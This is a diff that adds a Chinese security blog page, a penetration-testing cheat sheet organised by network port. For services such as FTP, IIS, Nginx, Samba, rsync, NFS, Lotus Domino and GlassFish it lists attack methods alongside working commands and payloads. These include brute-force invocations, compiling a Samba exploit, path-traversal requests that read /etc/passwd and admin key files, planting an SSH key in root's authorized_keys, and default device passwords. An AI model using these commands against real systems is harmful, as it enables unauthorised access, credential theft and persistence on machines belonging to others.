@@ -1,0 +1,693 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"><title>端口渗透总结 | V3teran's blog</title><meta name="keywords" content="端口"><meta name="author" content="V3teran"><meta name="copyright" content="V3teran"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="未完待续，持续更新。 服务默认端口 公认端口：0-1023 注册端口：1024-49151 动态&#x2F;私有：49152-65535，默认不为服务分配这些端口，出于安全考虑会将服务绑定到这些端口。  FTP：20、21、6920（数据端口）、21（控制端口）、69（tftp） 一种是使用系统软件来配置，比如IIS中的FTP文件共享或Linux中的默认服务软件，还有通过第三方软件来配置，比如Se">
+<meta property="og:type" content="article">
+<meta property="og:title" content="端口渗透总结">
+<meta property="og:url" content="https://v3teran.github.io/2021/02/07/%E7%AB%AF%E5%8F%A3%E6%B8%97%E9%80%8F%E6%80%BB%E7%BB%93/index.html">
+<meta property="og:site_name" content="V3teran&#39;s blog">
+<meta property="og:description" content="未完待续，持续更新。 服务默认端口 公认端口：0-1023 注册端口：1024-49151 动态&#x2F;私有：49152-65535，默认不为服务分配这些端口，出于安全考虑会将服务绑定到这些端口。  FTP：20、21、6920（数据端口）、21（控制端口）、69（tftp） 一种是使用系统软件来配置，比如IIS中的FTP文件共享或Linux中的默认服务软件，还有通过第三方软件来配置，比如Se">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/V3teran/cloudimg@main/post/20210402194504.jpg">
+<meta property="article:published_time" content="2021-02-07T09:00:00.000Z">
+<meta property="article:modified_time" content="2021-10-17T07:37:16.000Z">
+<meta property="article:author" content="V3teran">
+<meta property="article:tag" content="端口">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://cdn.jsdelivr.net/gh/V3teran/cloudimg@main/post/20210402194504.jpg"><link rel="shortcut icon" href="https://cdn.jsdelivr.net/gh/V3teran/cloudimg@main/img/20210204173816.png"><link rel="canonical" href="https://v3teran.github.io/2021/02/07/%E7%AB%AF%E5%8F%A3%E6%B8%97%E9%80%8F%E6%80%BB%E7%BB%93/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"search.xml","languages":{"hits_empty":"找不到您查询的内容：${query}"}},
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  date_suffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  source: {
+    justifiedGallery: {
+      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery@2/dist/fjGallery.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery@2/dist/fjGallery.min.css'
+    }
+  },
+  isPhotoFigcaption: false,
+  islazyload: true,
+  isAnchor: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: '端口渗透总结',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2021-10-17 15:37:16'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(win=>{
+    win.saveToLocal = {
+      set: function setWithExpiry(key, value, ttl) {
+        if (ttl === 0) return
+        const now = new Date()
+        const expiryDay = ttl * 86400000
+        const item = {
+          value: value,
+          expiry: now.getTime() + expiryDay,
+        }
+        localStorage.setItem(key, JSON.stringify(item))
+      },
+
+      get: function getWithExpiry(key) {
+        const itemStr = localStorage.getItem(key)
+
+        if (!itemStr) {
+          return undefined
+        }
+        const item = JSON.parse(itemStr)
+        const now = new Date()
+
+        if (now.getTime() > item.expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return item.value
+      }
+    }
+  
+    win.getScript = url => new Promise((resolve, reject) => {
+      const script = document.createElement('script')
+      script.src = url
+      script.async = true
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    })
+  
+      win.activateDarkMode = function () {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = function () {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+          if (t === 'dark') activateDarkMode()
+          else if (t === 'light') activateLightMode()
+        
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+    const detectApple = () => {
+      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+    })(window)</script><link rel="stylesheet" href="/css/lalala.css"><link rel="stylesheet" href="https://at.alicdn.com/t/font_2364346_8smao36j8yr.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/font-awesome/css/font-awesome.min.css"><script src="/live2d-widget/autoload.js"></script><meta name="generator" content="Hexo 6.0.0"></head><body><div id="loading-box"><div class="loading-left-bg"></div><div class="loading-right-bg"></div><div class="spinner-box"><div class="configure-border-1"><div class="configure-core"></div></div><div class="configure-border-2"><div class="configure-core"></div></div><div class="loading-word">加载中...</div></div></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg@main/img/20210204173845.png" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data is-center"><div class="data-item"><a href="/archives/"><div class="headline">文章</div><div class="length-num">35</div></a></div><div class="data-item"><a href="/tags/"><div class="headline">标签</div><div class="length-num">37</div></a></div><div class="data-item"><a href="/categories/"><div class="headline">分类</div><div class="length-num">8</div></a></div></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('https://cdn.jsdelivr.net/gh/V3teran/cloudimg@main/post/20210402194504.jpg')"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">V3teran's blog</a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">端口渗透总结</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2021-02-07T09:00:00.000Z" title="发表于 2021-02-07 17:00:00">2021-02-07</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2021-10-17T07:37:16.000Z" title="更新于 2021-10-17 15:37:16">2021-10-17</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E6%9D%82%E4%B8%83%E6%9D%82%E5%85%AB/">杂七杂八</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">字数总计:</span><span class="word-count">4.3k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>17分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="端口渗透总结"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><p>未完待续，持续更新。</p>
+<h1 id="服务默认端口"><a href="#服务默认端口" class="headerlink" title="服务默认端口"></a><strong>服务默认端口</strong></h1><ul>
+<li>公认端口：0-1023</li>
+<li>注册端口：1024-49151</li>
+<li>动态&#x2F;私有：49152-65535，默认不为服务分配这些端口，出于安全考虑会将服务绑定到这些端口。</li>
+</ul>
+<h1 id="FTP：20、21、69"><a href="#FTP：20、21、69" class="headerlink" title="FTP：20、21、69"></a>FTP：20、21、69</h1><p>20（数据端口）、21（控制端口）、69（tftp）</p>
+<p>一种是使用系统软件来配置，比如IIS中的FTP文件共享或Linux中的默认服务软件，还有通过第三方软件来配置，比如Serv-U还有一些网上写的简易ftp服务器等。</p>
+<p><strong>攻击方式</strong></p>
+<ol>
+<li>匿名访问</li>
+<li>弱口令</li>
+<li>后门：在linux的vsftp某一版本中，存在着一个后门程序，只要在用户名后面加上 就会在6200上打开一个监听Shell，可以使用telnet直接连接。</li>
+<li>远程溢出：6.10.1 IIS FTP远程溢出漏洞，在IIS FTP服务器中NLST命令存在一个缓冲区溢出漏洞，这个漏洞可能是攻击者在服务器运行一条非法命令。</li>
+<li>serv-u命令执行。</li>
+<li>命令行连接上直接执行命令添加guest用户（权限够的话）。</li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">quote site exec net user guest /active:yes</span><br></pre></td></tr></table></figure>
+
+<h1 id="SSH：22"><a href="#SSH：22" class="headerlink" title="SSH：22"></a>SSH：22</h1><p>基本会出现在Linux服务器，网络设备，安全设备等设备上。</p>
+<p><strong>攻击方式</strong></p>
+<ol>
+<li>弱口令</li>
+<li>28退格漏洞</li>
+<li>部分版本溢出</li>
+</ol>
+<h1 id="Telnet：23"><a href="#Telnet：23" class="headerlink" title="Telnet：23"></a><strong>Telnet：23</strong></h1><p><strong>攻击方式</strong></p>
+<ol>
+<li>弱口令</li>
+<li>无认证登录</li>
+</ol>
+<h1 id="SMTP：25、465"><a href="#SMTP：25、465" class="headerlink" title="SMTP：25、465"></a>SMTP：25、465</h1><p>25（smtp）、465（smtps）</p>
+<p>邮件协议，在linux中默认开启这个服务。</p>
+<p><strong>攻击方式</strong></p>
+<ol>
+<li>弱口令</li>
+<li>未授权访问</li>
+</ol>
+<h1 id="DNS：53"><a href="#DNS：53" class="headerlink" title="DNS：53"></a><strong>DNS：53</strong></h1><p><strong>攻击方式</strong></p>
+<ol>
+<li>域传送</li>
+<li>DDOS</li>
+</ol>
+<h1 id="DHCP：67、68、546"><a href="#DHCP：67、68、546" class="headerlink" title="DHCP：67、68、546"></a><strong>DHCP：67、68、546</strong></h1><p><strong>攻击方式</strong></p>
+<ol>
+<li>DHCP劫持：首先伪造Mac地址耗竭正常的DHCP服务器的IP地址，然后攻击者用自己的主机伪造一个DHCP服务器，那么新连上内网的主机只能使用流氓DHCP服务器分配的IP，这样黑客的主机就变成了内网网关，可以借此控制内网中其他主机的网络流量。</li>
+</ol>
+<h1 id="IIS：80、81、443"><a href="#IIS：80、81、443" class="headerlink" title="IIS：80、81、443"></a><strong>IIS：80、81、443</strong></h1><p><strong>攻击方式</strong></p>
+<ol>
+<li><p>PUT写文件：开启webdav，options-&gt;put-&gt;move。</p>
+</li>
+<li><p>短文件名泄漏：存在404，不存在400，这种一般没啥影响。</p>
+</li>
+<li><p>HTTP.SYS远程代码执行 (MS15-034)：win7-win2012</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Range: bytes=0-18446744073709551615 416 Requested Range Not Satisfiable</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>解析漏洞：</p>
+<p>*.asa和*.asp文件夹解析                  IIS 5.x&#x2F;6.x </p>
+<p>*.asp;*.jpg文件名解析                     ;相当于截断 </p>
+<p>&#x2F;1.XXX&#x2F;1.php       Fast-CGI模式       IIS 7.0&#x2F;7.5 </p>
+<p>asa、cdx、cer解析为asp</p>
+</li>
+<li><p>RCE： CVE-2017-7269         win2003+IIS6.0+WEBDAV</p>
+</li>
+</ol>
+<h1 id="Apache：80"><a href="#Apache：80" class="headerlink" title="Apache：80"></a>Apache：80</h1><p><strong>攻击方式</strong></p>
+<ol>
+<li><p>未知扩展名解析漏洞，1.php.zz                </p>
+<p>从后往前解析绕黑名单。</p>
+<p> AddHandler application&#x2F;x-httpd-php      只要包含.php后缀即解析为php。</p>
+</li>
+<li><p>HTTP慢速攻击：可以把服务器打死，对一些大型的网站有影响。</p>
+</li>
+<li><p>HTTPD换行解析漏洞（CVE-2017-15715），1.php\x0A被按照php后缀解析。</p>
+<p>影响范围：2.4.0~2.4.29版本。正则表达式$中也可以匹配\n或\r访问时需加上%0a。</p>
+</li>
+<li><p>路径穿越，CVE-2021-41773&amp;&amp;CVE-2021-42013</p>
+</li>
+</ol>
+<h1 id="Nginx：80"><a href="#Nginx：80" class="headerlink" title="Nginx：80"></a>Nginx：80</h1><p><strong>攻击方式</strong></p>
+<ol>
+<li><p>解析漏洞：cgi.fix_pathinfo默认为1，和IIS7.5一样。</p>
+<p>&#x2F;1.XXX&#x2F;1.php              PHP CGI漏洞，Nginx配置所导致，与Nginx、PHP版本无关。</p>
+</li>
+</ol>
+<p>&#x2F;1.XXX%00.php        （低版本）<br>   &#x2F;1.XXX&#x2F;%20\0.php</p>
+<p>   修复：</p>
+<p>   security.limit_extensions &#x3D; .php </p>
+<p>   cgi.fix_pathinfo&#x3D;0</p>
+<ol start="2">
+<li><p>空字节RCE：影响版本0.5*、 0.6*、0.7 &lt;&#x3D; 0.7.65、0.8 &lt;&#x3D; 0.8.37</p>
+<p>info.jpg..php        将jpg后面的.替换成%00。</p>
+</li>
+<li><p>文件名逻辑漏洞</p>
+<p>CVE-2013-4547    上传空格结尾的文件，然后访问.gif%20%00.php，该漏洞不受cgi.fix_pathinfo影响。</p>
+</li>
+<li><p>整数溢出</p>
+<p>CVE-2017-7529          对range域处理不当，文件缓存的部分可被读取。</p>
+</li>
+<li><p>配置错误导致漏洞</p>
+<p>CRLF注入 </p>
+<p>目录遍历 </p>
+<p>add_header覆盖</p>
+</li>
+<li><p>HTTP慢速攻击：可以把服务器打死，对一些大型的网站有影响。</p>
+</li>
+</ol>
+<h1 id="IPCAM：81"><a href="#IPCAM：81" class="headerlink" title="IPCAM：81"></a><strong>IPCAM：81</strong></h1><p>网络摄像机，一般用linux操作系统，内置web服务器，支持多种网络协议，一般做远程监控或者视频直播。</p>
+<p><strong>攻击方式</strong></p>
+<ol>
+<li>弱口令：海康威视admin&#x2F;12345、大华admin&#x2F;admin....…用zoomeye、shodan搜索。</li>
+</ol>
+<h1 id="POP3：109、110、995"><a href="#POP3：109、110、995" class="headerlink" title="POP3：109、110、995"></a><strong>POP3：109、110、995</strong></h1><p>109（POP2）、110（POP3）、995（POP3S）</p>
+<p><strong>攻击方式</strong></p>
+<ol>
+<li>弱口令</li>
+<li>未授权访问</li>
+</ol>
+<h1 id="Samba：137、139、445"><a href="#Samba：137、139、445" class="headerlink" title="Samba：137、139、445"></a>Samba：137、139、445</h1><p>137（NetBIOS名称服务）、139（samba服务）、445（Netbios）</p>
+<p>Samba是在Linux和UNIX系统上实现SMB（在局域网上共享文件和打印机的一种通信协议）协议的一个免费软件，samba可匿名登录，也可需要账号密码登录。</p>
+<p><strong>攻击方式</strong></p>
+<ol>
+<li><p>弱口令</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hydra -l username -P PassFile -e ns -t 4 -V smb://ip </span><br></pre></td></tr></table></figure>
+</li>
+<li><p>RCE：CVE-2017-7494、CVE-2015-0240</p>
+</li>
+<li><p>低版本溢出提权</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">searchsploit samba xxx </span><br><span class="line">cp /usr/share/exploitdb/exploits/multiple/remote/10.c </span><br><span class="line">gcc 10.c -o samba </span><br><span class="line">./samba -b 0 IP（-b 0指linux）</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>未授权访问：给予public用户高权限。</p>
+</li>
+</ol>
+<h1 id="Netbios：137、138、139"><a href="#Netbios：137、138、139" class="headerlink" title="Netbios：137、138、139"></a>Netbios：137、138、139</h1><p>137（udp）、138（udp）、139（TCP，SMB）</p>
+<p>基于TCP&#x2F;IP协议的网络互联。</p>
+<h1 id="IMAP：143、993"><a href="#IMAP：143、993" class="headerlink" title="IMAP：143、993"></a>IMAP：143、993</h1><p>143（imap）、993（imaps）</p>
+<p>邮件协议。</p>
+<p><strong>攻击方式</strong></p>
+<ol>
+<li>弱口令</li>
+<li>溢出</li>
+<li>命令注入</li>
+</ol>
+<h1 id="SNMP：161"><a href="#SNMP：161" class="headerlink" title="SNMP：161"></a><strong>SNMP：161</strong></h1><p>简单网络管理协议，V3是最新的版本，V1、V2c还存在问题，可远程读取主机信息。</p>
+<p><strong>攻击方式</strong></p>
+<ol start="41">
+<li>弱口令</li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">snmpwalk -v 2c -c public XXXXXX oid </span><br><span class="line">1.3.6.1.4.1.2011.5.2.1.10.1 </span><br><span class="line">1.3.6.1.4.1.2011.10.2.12.1.1.1 </span><br><span class="line">1.3.6.1.4.1.25506.2.12.1.1.1</span><br></pre></td></tr></table></figure>
+
+<h1 id="LDAP：389"><a href="#LDAP：389" class="headerlink" title="LDAP：389"></a>LDAP：389</h1><p>轻量级目录访问协议。</p>
+<p><strong>攻击方式</strong></p>
+<ol>
+<li>匿名访问：ldapbrowser</li>
+<li>弱口令</li>
+</ol>
+<h1 id="SMB：139、445"><a href="#SMB：139、445" class="headerlink" title="SMB：139、445"></a><strong>SMB：139、445</strong></h1><p>局域网文件共享传输协议。在WindowsNT中SMB基于NBT实现，即使用139（TCP）端口；而在Windows2000中，SMB除了基于NBT实现，还可以直接通过445端口实现。</p>
+<p><strong>攻击方式</strong></p>
+<ol>
+<li><p>匿名访问</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">smbclient -L IP -N get 文件名</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>远程溢出</p>
+<p>MS17-010 </p>
+<p>CVE-2020-0796</p>
+</li>
+</ol>
+<h1 id="Linux-R：512、513、514"><a href="#Linux-R：512、513、514" class="headerlink" title="Linux R：512、513、514"></a>Linux R：512、513、514</h1><p>一个UNIX系统远程登录命令。</p>
+<p><strong>攻击方式</strong></p>
+<ol>
+<li>使用rlogin直接登录对方系统。</li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rlogin ip -l username           指定用户名远程登录主机</span><br></pre></td></tr></table></figure>
+
+<h1 id="Rsync：873"><a href="#Rsync：873" class="headerlink" title="Rsync：873"></a>Rsync：873</h1><p>一个远程数据同步工具，备份工具，默认允许匿名访问。</p>
+<p><strong>攻击方式</strong></p>
+<ol>
+<li>匿名访问：rsync默认以root运行，上传webshell或者cron反弹shell。</li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">rsync XXXX:: </span><br><span class="line">rsync XXXX::文件/      </span><br><span class="line">rsync XXXXXX::src/etc/passwd /root         传文件（-r、-av ）</span><br><span class="line">rsync /root/passwd XXXXXX::src/tmp </span><br><span class="line">rsync rsync://XXXXX:873/ </span><br><span class="line">rsync rsync://XXXXX:873/文件/ </span><br><span class="line">rsync rsync://XXXXXXXX/src/etc/passwd /root </span><br><span class="line">rsync /root/文件 rsync://XXXXXXXX/src/etc/passwd </span><br></pre></td></tr></table></figure>
+
+<h1 id="Socket-agent：1080"><a href="#Socket-agent：1080" class="headerlink" title="Socket agent：1080"></a><strong>Socket agent：1080</strong></h1><p><strong>攻击方式</strong></p>
+<ol>
+<li>可以尝试爆破一下代理的用户名和密码。</li>
+</ol>
+<h1 id="RMI：1090、1099"><a href="#RMI：1090、1099" class="headerlink" title="RMI：1090、1099"></a><strong>RMI：1090、1099</strong></h1><p><strong>攻击方式</strong></p>
+<ol>
+<li>远程命令执行（java反序列化，调用rmi方式执行命令）</li>
+</ol>
+<h1 id="Lotus：1352"><a href="#Lotus：1352" class="headerlink" title="Lotus：1352"></a><strong>Lotus：1352</strong></h1><p>IBMx旗下的管理软件。</p>
+<p><strong>攻击方式</strong></p>
+<ol>
+<li><p>弱口令（控制台） admin&#x2F;password</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">/names.nsf </span><br><span class="line">/webadmin.nsf </span><br><span class="line">/mail/用户名.nsf </span><br><span class="line">选择&quot;Server&quot;-&quot;Status&quot;-&quot;Quick console&quot;,执行命令 </span><br><span class="line">命令格式：load cmd /c ping c4vm7l.dnslog.cn</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>信息泄露</p>
+</li>
+<li><p>跨站脚本攻击</p>
+</li>
+<li><p>未授权访问</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">MailFS?OpenFrameset</span><br></pre></td></tr></table></figure></li>
+</ol>
+<h1 id="MSSQL：1433、1434"><a href="#MSSQL：1433、1434" class="headerlink" title="MSSQL：1433、1434"></a>MSSQL：1433、1434</h1><p>1433（Server 数据库服务）、1434（Monitor 数据库监控）</p>
+<p><strong>攻击方式</strong></p>
+<ol>
+<li>弱口令（可尝试系统用户）</li>
+</ol>
+<h1 id="Oracle：1521"><a href="#Oracle：1521" class="headerlink" title="Oracle：1521"></a><strong>Oracle：1521</strong></h1><p>默认端口：1521（数据库端口）、1158（Oracle EMCTL端口）、8080（Oracle XDB数据库）、210（Oracle XDB FTP服务）</p>
+<p><strong>攻击方式</strong></p>
+<ol>
+<li>弱口令</li>
+<li>注入结合XXE</li>
+</ol>
+<h1 id="NFS：2049"><a href="#NFS：2049" class="headerlink" title="NFS：2049"></a><strong>NFS：2049</strong></h1><p>网络文件系统，通过TCP&#x2F;IP网络共享资源。在NFS的应用中，本地NFS的客户端应用可以透明地读写位于远端NFS服务器上的文件，就像访问本地文件一样。</p>
+<p><strong>攻击方式</strong></p>
+<ol>
+<li>未授权访问：未限制IP以及用户权限设置错误。</li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">rpcinfo -p server_ip          #扫描服务器 </span><br><span class="line">showmount -e server_ip        #查看nfs挂载 </span><br><span class="line">mount -t nfs server_ip:/路径 /tmp/test      #客户端挂载，挂载到本地的/tmp/test路径    </span><br><span class="line">#配置ssh永久连接 </span><br><span class="line">mount -t nfs server_ip:/路径 /tmp/test </span><br><span class="line">ssh-keygen </span><br><span class="line">cat ~/.ssh/id_rsa.pub &gt;&gt; /tmp/test/root/.ssh/autorized_keys ssh root@server_ip </span><br><span class="line">umount /tmp/   #卸载挂载</span><br></pre></td></tr></table></figure>
+
+<h1 id="Zookeeper：2181"><a href="#Zookeeper：2181" class="headerlink" title="Zookeeper：2181"></a><strong>Zookeeper：2181</strong></h1><p>分布式的，开放源码的分布式应用程序协调服务；提供功能包括：配置维护、域名服务、分布式同步、组服务等。</p>
+<p><strong>攻击方式</strong></p>
+<ol>
+<li>未授权访问，可以使用zooinspector远程连接。</li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">echo envi |nc XXXXX 2181 </span><br><span class="line">echo dump |nc XXXXX 2181 </span><br><span class="line">echo stat |nc XXXXX 2181 </span><br><span class="line">echo ruok |nc XXXXX 2181 </span><br><span class="line">echo reqs |nc XXXXX 2181</span><br></pre></td></tr></table></figure>
+
+<h1 id="Grafana：3000"><a href="#Grafana：3000" class="headerlink" title="Grafana：3000"></a>Grafana：3000</h1><p><strong>攻击方式</strong></p>
+<ol>
+<li>弱口令</li>
+<li>SSRF</li>
+<li>未授权访问</li>
+<li>任意文件读取</li>
+</ol>
+<h1 id="MySQL：3306"><a href="#MySQL：3306" class="headerlink" title="MySQL：3306"></a>MySQL：3306</h1><p><strong>攻击方式</strong></p>
+<ol>
+<li>弱口令</li>
+<li>身份认证漏洞：CVE-2012-2122任意密码登录，理论尝试256次即可</li>
+<li>All MariaDB and MySQL versions up to 5.1.61, 5.2.11, 5.3.5, 5.5.22 are</li>
+<li>Phpmyadmin万能密码绕过：用户名：‘localhost‘@‘@”  密码任意</li>
+<li>拒绝服务攻击：利用sql语句是服务器进行死循环打死服务器</li>
+</ol>
+<h1 id="Windows-RDP：3389"><a href="#Windows-RDP：3389" class="headerlink" title="Windows RDP：3389"></a>Windows RDP：3389</h1><p>可能改为：3390、13389</p>
+<p><strong>攻击方式</strong></p>
+<ol>
+<li>弱口令</li>
+<li>Shift粘滞键后门</li>
+<li>ms12-020蓝屏</li>
+</ol>
+<h1 id="GlassFish：4848、8080、3700"><a href="#GlassFish：4848、8080、3700" class="headerlink" title="GlassFish：4848、8080、3700"></a>GlassFish：4848、8080、3700</h1><p>4848（控制台）、8080（web）、3700（iiop）</p>
+<p><strong>攻击方式</strong></p>
+<ol>
+<li><p>弱口令（控制台）</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Applications-&gt;deploy</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>任意文件读取</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">:4848/theme/META-INF/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd </span><br><span class="line">:4848/theme/META-INF/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/domains/domain1/config/admin-keyfile</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>认证绕过</p>
+<p>CVE-2011-1511</p>
+</li>
+</ol>
